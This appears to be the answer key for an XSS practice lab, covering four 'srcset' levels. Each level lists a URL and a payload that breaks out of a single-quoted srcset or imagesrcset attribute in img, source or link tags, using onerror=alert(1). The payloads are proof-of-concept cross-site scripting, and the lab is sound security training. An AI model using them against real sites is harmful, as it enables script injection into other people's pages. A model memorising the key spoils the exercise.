# srcset — solutions

Single-quote attribute injection in srcset / imagesrcset of img / source / link tags.

### srcset-level1

`/srcset/level1/?query=x'%20onerror=alert(1)%20'`

- payload: `x' onerror=alert(1) '`
- context: `<img srcset='...'>`; single-quote breakout adds onerror

### srcset-level2

`/srcset/level2/?query=x'%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `x'><img src=x onerror=alert(1)>`
- context: `<source srcset='...'>` inside `<picture>`; attribute breakout

### srcset-level3

`/srcset/level3/?query=x'%20onerror=alert(1)%20'`

- payload: `x' onerror=alert(1) '`
- context: `<img srcset='... 1x'>`; commas stripped but single-quote still breaks

### srcset-level4

`/srcset/level4/?query=x'%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `x'><img src=x onerror=alert(1)>`
- context: `<link rel='preload' as='image' imagesrcset='...'>`; quote breakout
